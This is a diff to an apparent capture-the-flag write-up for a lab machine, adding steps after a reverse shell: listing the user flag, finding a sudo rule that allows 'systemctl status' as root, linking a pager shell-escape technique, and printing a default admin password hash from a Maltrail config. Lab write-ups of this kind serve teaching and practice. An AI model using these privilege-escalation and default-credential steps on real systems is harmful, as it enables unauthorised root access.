@@ -144,6 +144,39 @@ connect to [10.10.14.47] from (UNKNOWN) [10.10.11.224] 42082
 $
 ```
 
+Can now get the user flag:
+
+```bash
+$ ls -lar
+ls -lar
+total 876
+-rw-r----- 1 root puma     33 Aug  7 16:46 user.txt
+```
+
+# Root flag
+
+Checking sudo permissions returns the following:
+
+```bash
+puma@sau:/opt/maltrail$ sudo -l
+
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+```
+
+This can be exploited to spawn a shell ([article](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/#spawn-shell-in-the-pager))
+
+Check the `maltrail.conf` file and found default password for admin:
+
+```bash
+admin:9ab3cd9d67bf49d01f6a2e33d0bd9bc804ddbe6ce1ff5d219c42624851db5dbc:0:                        # changeme!
+```
+
+Hash decodes to `changeme!`.
 
 
 
